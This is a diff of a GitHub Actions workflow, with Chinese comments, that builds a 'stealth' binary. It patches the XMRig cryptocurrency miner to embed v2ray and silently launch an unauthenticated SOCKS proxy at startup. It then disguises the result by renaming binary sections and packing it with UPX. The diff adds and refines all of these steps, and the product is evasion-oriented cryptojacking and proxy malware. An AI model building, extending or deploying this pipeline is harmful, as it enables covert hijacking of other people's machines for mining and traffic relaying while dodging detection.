@@ -1,59 +1,71 @@
-name: XMRig-v2ray Stealth Build
+name: XMRig-v2ray Fusion Build
 
 on:
   workflow_dispatch:
-  schedule:
-    - cron: '0 0 * * *'
+  push:
+    branches: [ main ]
 
 jobs:
   stealth-build:
     runs-on: ubuntu-latest
-    timeout-minutes: 30
+    timeout-minutes: 35
 
     steps:
-    # 阶段 1：克隆源代码
+    # ========== 阶段1：获取源代码 ==========
     - name: Clone XMRig
       uses: actions/checkout@v4
       with:
         repository: xmrig/xmrig
-        path: src/xmrig
+        path: xmrig-src
+        ref: v6.21.0  # 指定稳定版本
 
     - name: Clone v2ray-core
       uses: actions/checkout@v4
       with:
         repository: v2fly/v2ray-core
-        path: src/v2ray
+        path: v2ray-src
+        ref: v5.7.0  # 指定稳定版本
 
-    # 阶段 2：环境配置
+    # ========== 阶段2：环境配置 ==========
     - name: Setup Build Environment
       run: |
         sudo apt-get update
-        sudo apt-get install -y \
+        sudo DEBIAN_FRONTEND=noninteractive apt-get install -y \
           build-essential cmake libuv1-dev libssl-dev libhwloc-dev \
           golang upx-ucl xxd python3-pip
         pip install pefile
 
-    # 阶段 3：构建v2ray代理核心
+    # ========== 阶段3：构建v2ray ==========
     - name: Build v2ray Binary
-      working-directory: src/v2ray
+      working-directory: v2ray-src
       run: |
-        CGO_ENABLED=0 go build -ldflags "-s -w -buildid=" -trimpath -o v2ray ./main
+        CGO_ENABLED=0 go build \
+          -ldflags "-s -w -buildid=" \
+          -trimpath \
+          -o v2ray \
+          ./main
 
-    # 阶段 4：代码融合
+    # ========== 阶段4：代码融合 ==========
     - name: Embed v2ray into XMRig
       run: |
-        # 将v2ray二进制转换为C头文件
-        xxd -i src/v2ray/v2ray > src/xmrig/src/v2ray_embed.h
+        # 将v2ray转换为C字节数组
+        xxd -i v2ray-src/v2ray xmrig-src/src/v2ray_embed.h
 
-        # 创建自动代理配置文件
-        cat << EOF > src/xmrig/v2ray_config.json
+        # 生成默认v2ray配置
+        mkdir -p xmrig-src/src/v2ray
+        cat << EOF > xmrig-src/src/v2ray/config.json
         {
           "inbounds": [{
-            "port": 1080,
+            "port": 10808,
             "protocol": "socks",
             "settings": {
               "auth": "noauth",
-              "udp": true
+              "udp": true,
+              "userLevel": 0
+            },
+            "streamSettings": {
+              "network": "tcp",
+              "security": "none"
             }
           }],
           "outbounds": [{
@@ -63,62 +75,74 @@ jobs:
         }
         EOF
 
-    # 阶段 5：修改XMRig源代码
-    - name: Patch XMRig Source Code
-      working-directory: src/xmrig
+    # ========== 阶段5：修改XMRig源码 ==========
+    - name: Patch XMRig Source
+      working-directory: xmrig-src
       run: |
-        # 在App.h中添加函数声明
-        sed -i '/namespace xmrig {/a \    void StartProxy();' src/App.h
+        # 在App.h中添加代理函数声明
+        sed -i '/namespace xmrig {/a \    void StartV2rayProxy();' src/App.h
 
-        # 在App.cpp中添加函数实现
+        # 在App.cpp中实现代理逻辑
         cat << 'EOF' >> src/App.cpp
         #include "v2ray_embed.h"
         #include <cstdio>
         #include <cstdlib>
+        #include <sys/stat.h>
         
-        void xmrig::StartProxy() {
+        void xmrig::StartV2rayProxy() {
+            // 写入v2ray二进制
             FILE* f = fopen("v2ray", "wb");
-            if (f) {
-                fwrite(v2ray, 1, v2ray_len, f);
-                fclose(f);
-                chmod("v2ray", 0700);
-                system("./v2ray run -config=v2ray_config.json >/dev/null 2>&1 &");
-            }
+            if (!f) return;
+            fwrite(v2ray, 1, v2ray_len, f);
+            fclose(f);
+            chmod("v2ray", 0700);
+            
+            // 启动代理
+            system("nohup ./v2ray run -config=./src/v2ray/config.json > /dev/null 2>&1 &");
+            
+            // 等待代理启动
+            sleep(3);
         }
         EOF
 
-        # 在Platform.cpp注入启动调用
-        sed -i '/void Platform::init(/a \ \ \ \ StartProxy();' src/base/kernel/Platform.cpp
+        # 在Platform初始化时调用代理
+        sed -i '/void Platform::init(/a \ \ \ \ StartV2rayProxy();' src/base/kernel/Platform.cpp
 
-        # 修改CMakeLists.txt包含新头文件
-        sed -i '/set(HEADERS/ a \ \ \ \ src/v2ray_embed.h' CMakeLists.txt
+        # 修改CMake配置包含新头文件
+        sed -i '/set(HEADERS_BASE_HTTP/a \ \ \ \ "${CMAKE_SOURCE_DIR}/src/v2ray_embed.h"' CMakeLists.txt
 
-    # 阶段 6：混淆编译
-    - name: Build Obfuscated XMRig
-      working-directory: src/xmrig
+    # ========== 阶段6：编译与混淆 ==========
+    - name: Build & Obfuscate
+      working-directory: xmrig-src
       run: |
         mkdir -p build
         cd build
+
+        # 配置编译选项
         cmake .. \
           -DWITH_HTTPD=OFF \
           -DWITH_OPENCL=OFF \
           -DWITH_CUDA=OFF \
           -DCMAKE_BUILD_TYPE=Release \
-          -DCMAKE_CXX_FLAGS="-flto -fomit-frame-pointer -march=native"
-        
+          -DCMAKE_CXX_FLAGS="-flto -fomit-frame-pointer"
+
+        # 并行编译
         make -j$(nproc)
 
         # 二进制混淆处理
-        objcopy --rename-section .text=.cryptext \
-                --rename-section .data=.cryptdata \
-                xmrig
+        objcopy \
+          --rename-section .text=.cryptext \
+          --rename-section .data=.cryptdata \
+          --rename-section .rodata=.cryptrodata \
+          xmrig
 
-        # 高级压缩
-        upx --ultra-brute --lzma xmrig -o xmrig_stealth
+        # 使用UPX进行多层压缩
+        upx --ultra-brute --lzma --best xmrig -o xmrig_stealth
 
-    # 阶段 7：发布结果
-    - name: Upload Stealth Binary
+    # ========== 阶段7：发布结果 ==========
+    - name: Upload Artifact
       uses: actions/upload-artifact@v4
       with:
         name: xmrig-stealth
-        path: src/xmrig/build/xmrig_stealth
+        path: xmrig-src/build/xmrig_stealth
+        retention-days: 1
